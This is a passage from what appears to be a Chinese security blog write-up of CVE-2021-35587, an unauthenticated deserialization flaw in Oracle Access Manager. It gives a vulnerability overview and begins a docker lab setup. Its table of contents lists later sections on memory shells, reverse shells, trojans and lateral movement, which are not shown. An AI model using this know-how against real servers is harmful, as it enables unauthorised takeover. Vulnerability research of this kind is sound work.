href=#memsdjava%e5%8d%b8%e8%bd%bd%e5%86%85%e5%ad%98%e9%a9%ac aria-label=memsd.java：卸载内存马>memsd.java：卸载内存马</a><ul><li><a href=#%e6%b3%a8%e6%84%8f%e7%82%b9-2 aria-label=注意点>注意点</a></li><li><a href=#%e6%9c%80%e7%bb%88%e6%95%88%e6%9e%9c-7 aria-label=最终效果>最终效果</a></li><li><a href=#%e6%97%a0%e5%9b%9e%e6%98%be%e6%89%a7%e8%a1%8c%e5%91%bd%e4%bb%a4 aria-label=无回显执行命令>无回显执行命令</a></li><li><a href=#%e5%9b%9e%e6%98%be%e6%89%a7%e8%a1%8c%e5%91%bd%e4%bb%a4 aria-label=回显执行命令>回显执行命令</a></li><li><a href=#%e6%b3%a8%e5%85%a5%e5%86%85%e5%ad%98%e9%a9%ac aria-label=注入内存马>注入内存马</a></li><li><a href=#%e5%8d%b8%e8%bd%bd%e6%9b%b4%e6%96%b0%e5%86%85%e5%ad%98%e9%a9%ac aria-label=卸载/更新内存马>卸载/更新内存马</a></li><li><a href=#%e6%9c%ba%e5%99%a8%e4%b8%8d%e5%87%ba%e7%bd%91%e6%97%b6%e5%a4%8d%e7%94%a8dns%e9%9a%a7%e9%81%93%e5%8f%8d%e5%bc%b9shell aria-label=机器不出网时复用DNS隧道反弹shell>机器不出网时复用DNS隧道反弹shell</a></li><li><a href=#%e6%a8%aa%e5%90%91%e6%94%bb%e5%87%bb%e5%86%85%e7%bd%91redis aria-label=横向攻击内网Redis>横向攻击内网Redis</a></li></ul></li><li><a href=#%e4%b8%80%e4%ba%9b%e6%9c%a8%e9%a9%ac aria-label=一些木马>一些木马</a><ul><li><a href=#%e6%99%ae%e9%80%9ajsp%e6%9c%a8%e9%a9%ac aria-label=普通JSP木马>普通JSP木马</a></li><li><a href=#%e5%8a%a0%e5%af%86%e6%b5%81%e9%87%8fjsp%e6%9c%a8%e9%a9%ac aria-label=加密流量JSP木马>加密流量JSP木马</a></li><li><a href=#%e6%99%ae%e9%80%9a%e5%86%85%e5%ad%98%e9%a9%ac aria-label=普通内存马>普通内存马</a></li><li><a href=#%e5%8a%a0%e5%af%86%e6%b5%81%e9%87%8f%e5%86%85%e5%ad%98%e9%a9%ac aria-label=加密流量内存马>加密流量内存马</a></li></ul></li><li><a href=#%e4%bf%ae%e5%a4%8d aria-label=修复>修复</a></li></ul></li><li><a href=#%e8%b0%83%e8%af%95%e6%8a%80%e5%b7%a7%e5%92%8c%e5%b8%b8%e8%a7%81%e9%97%ae%e9%a2%98 aria-label=调试技巧和常见问题>调试技巧和常见问题</a><ul><li><a href=#%e9%87%8d%e7%bd%ae%e5%88%b0%e8%b0%83%e7%94%a8%e6%a0%88%e6%9f%90%e4%b8%aa%e6%a0%88%e5%b8%a7 aria-label=重置到调用栈某个栈帧>重置到调用栈某个栈帧</a></li><li><a href=#%e5%bc%82%e5%b8%b8%e6%96%ad%e7%82%b9%e5%a6%82%e4%bd%95%e5%ba%94%e5%af%b9%e4%bb%8e%e6%b2%a1%e6%9c%89%e4%ba%ba%e9%81%87%e5%88%b0%e8%bf%87%e7%9a%84%e6%8a%a5%e9%94%99 aria-label=异常断点：如何应对从没有人遇到过的报错>异常断点：如何应对从没有人遇到过的报错</a></li><li><a href=#%e6%9d%a1%e4%bb%b6%e6%96%ad%e7%82%b9%e9%99%90%e5%88%b6%e6%96%ad%e7%82%b9%e8%a7%a6%e5%8f%91%e5%9c%ba%e6%99%af%e5%87%8f%e5%b0%91%e5%b9%b2%e6%89%b0%e4%bf%a1%e6%81%af aria-label=条件断点：限制断点触发场景减少干扰信息>条件断点：限制断点触发场景减少干扰信息</a></li><li><a href=#evaluate-expression%e5%8a%9f%e8%83%bd aria-label="Evaluate Expression功能">Evaluate Expression功能</a></li><li><a href=#%e5%a6%82%e4%bd%95%e7%a1%ae%e5%ae%9ajvm%e4%b8%ad%e6%98%af%e5%90%a6%e5%8a%a0%e8%bd%bd%e4%ba%86%e6%9f%90%e4%b8%aa%e7%b1%bb aria-label=如何确定JVM中是否加载了某个类？>如何确定JVM中是否加载了某个类？</a></li><li><a href=#%e5%a6%82%e4%bd%95%e4%b8%8d%e8%b0%83%e8%af%95%e6%9f%a5%e7%9c%8b%e6%9c%8d%e5%8a%a1%e7%ab%af%e6%9f%90%e6%96%b9%e6%b3%95%e7%9a%84%e8%bf%94%e5%9b%9e%e5%80%bc aria-label=如何不调试查看服务端某方法的返回值？>如何不调试查看服务端某方法的返回值？</a></li><li><a href=#%e4%b8%ba%e4%bd%95%e6%9c%89%e6%97%b6%e6%8c%82%e4%b8%8a%e8%b0%83%e8%af%95%e5%90%8e%e5%ba%94%e7%94%a8%e5%8d%a1%e6%ad%bb aria-label=为何有时挂上调试后应用卡死？>为何有时挂上调试后应用卡死？</a></li><li><a href=#%e8%b0%83%e8%af%95%e6%97%b6%e6%97%a0%e6%b3%95%e8%bf%9b%e5%85%a5java%e5%8c%85%e4%b8%ad%e7%9a%84%e4%bb%a3%e7%a0%81 aria-label=调试时无法进入java.*包中的代码？>调试时无法进入java.*包中的代码？</a></li><li><a href=#arthas%e9%99%84%e5%88%b0java%e8%bf%9b%e7%a8%8b%e5%90%8eidea%e8%b0%83%e8%af%95%e5%87%ba%e9%97%ae%e9%a2%98 aria-label=arthas附到Java进程后idea调试出问题>arthas附到Java进程后idea调试出问题</a></li><li><a href=#%e4%b8%8b%e6%96%ad%e7%82%b9%e6%98%be%e7%a4%ba%e7%81%b0%e8%89%b2%e6%80%8e%e4%b9%88%e5%8a%9e aria-label=下断点显示灰色怎么办？>下断点显示灰色怎么办？</a></li><li><a href=#%e5%85%b3%e9%97%adsmart-step-into aria-label="关闭smart step into">关闭smart step into</a></li><li><a href=#%e6%af%94%e8%be%83%e5%ad%97%e8%8a%82%e6%b5%81 aria-label=比较字节流>比较字节流</a></li><li><a href=#%e8%83%bd%e4%bb%8ejvm%e5%8d%b8%e8%bd%bd%e4%b8%80%e4%b8%aa%e7%b1%bb%e5%8a%a0%e8%bd%bd%e4%b8%80%e4%b8%aa%e7%b1%bb%e7%9a%84%e6%96%b0%e7%89%88%e6%9c%ac%e5%90%97 aria-label=能从jvm卸载一个类/加载一个类的新版本吗？>能从jvm卸载一个类/加载一个类的新版本吗？</a></li><li><a href=#%e5%a6%82%e4%bd%95%e7%9f%a5%e9%81%93%e6%81%b6%e6%84%8f%e4%bb%a3%e7%a0%81%e6%98%af%e5%90%a6%e8%a2%ab%e6%89%a7%e8%a1%8c%e4%ba%86 aria-label=如何知道恶意代码是否被执行了？>如何知道恶意代码是否被执行了？</a></li><li><a href=#%e5%a6%82%e4%bd%95%e4%bf%9d%e6%8c%81%e8%89%af%e5%a5%bd%e7%9a%84%e5%bf%83%e6%80%81 aria-label=如何保持良好的心态？>如何保持良好的心态？</a></li><li><a href=#%e9%81%97%e7%95%99%e9%97%ae%e9%a2%98%e5%a6%82%e4%bd%95%e8%b7%9f%e8%b8%aanative%e8%b0%83%e7%94%a8%e7%9a%84%e8%bf%9b%e5%87%ba aria-label=遗留问题：如何跟踪native调用的进出？>遗留问题：如何跟踪native调用的进出？</a></li></ul></li><li><a href=#%e6%89%a9%e5%b1%95%e9%98%85%e8%af%bb aria-label=扩展阅读>扩展阅读</a></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h1 id=漏洞概况>漏洞概况<a hidden class=anchor aria-hidden=true href=#漏洞概况>#</a></h1><p><strong>CVE公告</strong></p><blockquote><p>Vulnerability in the Oracle Access Manager product of Oracle Fusion Middleware (component: OpenSSO Agent). Supported versions that are affected are 11.1.2.3.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager. Successful attacks of this vulnerability can result in takeover of Oracle Access Manager. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).</p><p>—— <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35587">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35587</a></p></blockquote><p><strong>OAM是什么</strong></p><p>Oracle Access Manager (OAM) 提供身份管理（使用用户、组和机构管理、自助服务、流程管理功能和委托管理）、验证和授权服务，以及合规性报告。</p><p>可以理解为Oracle生态中一套单点登陆系统。</p><p><strong>CVE-2021-35587能达成什么效果</strong></p><p>利用该漏洞，任意能够访问OAM的攻击者，无需认证即可攻占OAMServer。</p><p><strong>CVE-2021-35587的影响版本有哪些</strong></p><blockquote><p>11.1.2.3.0, 12.2.1.3.0, 12.2.1.4.0</p><p>——https://www.oracle.com/security-alerts/cpujan2022.html#AppendixFMW</p></blockquote><p><strong>基本原理</strong></p><p>这是一个Java原生反序列化漏洞，接受和处理反序列化数据的接口是无认证的。</p><p>因为OAM包含weblogic，所以反序列化过程可以借助weblogic的gadget达成任意Java代码执行，进而执行任意命令以攻占服务器，getshell和横向移动。</p><h1 id=本地搭建oam>本地搭建OAM<a hidden class=anchor aria-hidden=true href=#本地搭建oam>#</a></h1><p>因为这是一套相对复杂的环境，所以搭建可用的OAM调试分析环境在利用CVE-2021-35587这个漏洞的过程中占据了相当大一部分时间。在这一点上，漏洞原作者和我有同样的体会。为了节省后来的分析者，以及以后的自己的宝贵的时间，我把OAM环境搭建方法和搭建过程中踩到的各种各样的坑总结在此。</p><h2 id=大纲>大纲<a hidden class=anchor aria-hidden=true href=#大纲>#</a></h2><p>参考 <a href=https://docs.oracle.com/en/middleware/idm/access-manager/12.2.1.4/tutorial-oam-docker/#Background>https://docs.oracle.com/en/middleware/idm/access-manager/12.2.1.4/tutorial-oam-docker/#Background</a> 使用方法2获取OAM镜像</p><blockquote><ol><li>Download a prebuilt OAM image from <a href=https://container-registry.oracle.com/>Oracle Container Registry</a> by by navigating to <strong>Middleware</strong> > <strong>oam</strong>. This image contains no patches and should only be used in Developer or Test environments.</li></ol></blockquote><p>下载到的OAM镜像用于跑起来三个OAM容器</p><blockquote><ul><li>WebLogic Administration Server (<code>AdminServer</code>)</li><li>OAM Managed Server (<code>oam_server1</code>)</li><li>OAM Policy Manager Managed Server (<code>oam_policy_mgr1</code>)</li></ul></blockquote><p>跑起来这三个容器依赖一个可用的Oracle数据库</p><h2 id=步骤汇总>步骤汇总<a hidden class=anchor aria-hidden=true href=#步骤汇总>#</a></h2><ol><li><p>创建一台全新的Ubuntu18.04，切换到root用户。</p></li><li><p>在 <a href=https://hub.docker.com/_/oracle-database-enterprise-edition>https://hub.docker.com/_/oracle-database-enterprise-edition</a> 和 <a href=https://container-registry.oracle.com/>https://container-registry.oracle.com/</a> 登录账号后同意协议。（参考步骤二）</p></li><li><p>安装docker</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># apt update</span>
</span></span><span style=display:flex><span><span style=color:#75715e># apt install docker.io</span>
</span></span></code></pre></td></tr></table></div></div></li><li><p>docker 登录dockerhub 和 container-registry.oracle.com</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># ocker login</span>
</span></span><span style=display:flex><span>	输入 login.docker.com 的账号密码	
</span></span><span style=display:flex><span><span style=color:#75715e># docker login container-registry.oracle.com</span>
</span></span><span style=display:flex><span>	输入 login.oracle.com 的账号密码
</span></span></code></pre></td></tr></table></div></div></li><li><p>拉取两个镜像</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># docker pull store/oracle/database-enterprise:12.2.0.1</span>
</span></span><span style=display:flex><span><span style=color:#75715e># docker pull container-registry.oracle.com/middleware/oam:12.2.1.4.0</span>
</span></span></code></pre></td></tr></table></div></div></li><li><p>一些准备工作</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># docker network create -d bridge OamNET</span>
</span></span><span style=display:flex><span><span style=color:#75715e># mkdir -p /scratch/user_projects</span>
</span></span><span style=display:flex><span><span style=color:#75715e># chmod 777 /scratch/user_projects</span>
</span></span></code></pre></td></tr></table></div></div></li><li><p>启动四个容器（<strong>注意：将以下命令中的<code>172.17.0.1</code>替换为docker虚拟网卡网关的IP</strong>）</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker run -d -it --name myOracleDB -p 1521:1521 store/oracle/database-enterprise:12.2.0.1
</span></span><span style=display:flex><span>docker run -d --network<span style=color:#f92672>=</span>OamNET -p 7001:7001 --name<span style=color:#f92672>=</span>oamadmin --env CONNECTION_STRING<span style=color:#f92672>=</span>172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env RCUPREFIX<span style=color:#f92672>=</span>OAM1 --env DB_USER<span style=color:#f92672>=</span>sys --env DB_PASSWORD<span style=color:#f92672>=</span>Oradoc_db1 --env DB_SCHEMA_PASSWORD<span style=color:#f92672>=</span>Oradoc_db2 -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0
</span></span><span style=display:flex><span>docker run -d -p 14100:14100 --network<span style=color:#f92672>=</span>OamNET --volumes-from oamadmin --name oamms --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env MANAGEDSERVER_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>14100</span> --env MANAGED_SERVER_CONTAINER<span style=color:#f92672>=</span>true --env MS_NAME<span style=color:#f92672>=</span>oam_server1 --env MS_HOST<span style=color:#f92672>=</span>oamms container-registry.oracle.com/middleware/oam:12.2.1.4.0 <span style=color:#e6db74>&#34;/u01/oracle/dockertools/startMS.sh&#34;</span>
</span></span><span style=display:flex><span>docker run -d -p 15100:15100 --network<span style=color:#f92672>=</span>OamNET --volumes-from oamadmin --name oampolicy --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env MANAGEDSERVER_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>15100</span> --env MANAGED_SERVER_CONTAINER<span style=color:#f92672>=</span>true --env MS_NAME<span style=color:#f92672>=</span>oam_policy_mgr1 --env MS_HOST<span style=color:#f92672>=</span>oampolicy container-registry.oracle.com/middleware/oam:12.2.1.4.0 <span style=color:#e6db74>&#34;/u01/oracle/dockertools/startMS.sh&#34;</span>
</span></span></code></pre></td></tr></table></div></div></li><li><p>查看各服务的IP地址</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker inspect -f <span style=color:#e6db74>&#39;{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}&#39;</span> oamadmin oamms oampolicy myOracleDB
</span></span></code></pre></td></tr></table></div></div></li><li><p>使用以下链接访问服务。（<strong>注意：将192.168.0.105替换为虚拟机IP</strong>）</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-7>7</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>账号：weblogic  密码：W3bl@gic
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>WebLogic Administration Console   http://192.168.0.105:7001/console         
</span></span><span style=display:flex><span>Oracle Enterprise Manager Console http://192.168.0.105:7001/em       
</span></span><span style=display:flex><span>Oracle Access Management Console  http://192.168.0.105:7001/oamconsole
</span></span><span style=display:flex><span>OAM Server Logout                 http://192.168.0.105:14100/oam/server/logout
</span></span><span style=display:flex><span>Policy Manager Access             http://192.168.0.105:15100/access
</span></span></code></pre></td></tr></table></div></div></li></ol><h2 id=运行oracle数据库>①运行Oracle数据库<a hidden class=anchor aria-hidden=true href=#运行oracle数据库>#</a></h2><h3 id=创建oracle数据库>创建Oracle数据库<a hidden class=anchor aria-hidden=true href=#创建oracle数据库>#</a></h3><p>参考 <a href=https://hub.docker.com/_/oracle-database-enterprise-edition>https://hub.docker.com/_/oracle-database-enterprise-edition</a> 登陆账号后跳转到 <a href=https://hub.docker.com/u/findneo/content/sub-3762ef81-7448-4275-909b-df7e6b5d4070>https://hub.docker.com/u/findneo/content/sub-3762ef81-7448-4275-909b-df7e6b5d4070</a> ，同意协议。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-8>8</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># sudo docker login </span>
</span></span><span style=display:flex><span>输入docker hub的账号密码
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># sudo docker pull store/oracle/database-enterprise:12.2.0.1</span>
</span></span><span style=display:flex><span>拉取镜像
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># sudo docker run -d -it --name myOracleDB -p 1521:1521 store/oracle/database-enterprise:12.2.0.1</span>
</span></span><span style=display:flex><span>运行起来一个Oracle数据库，并且开放到本地的1521端口
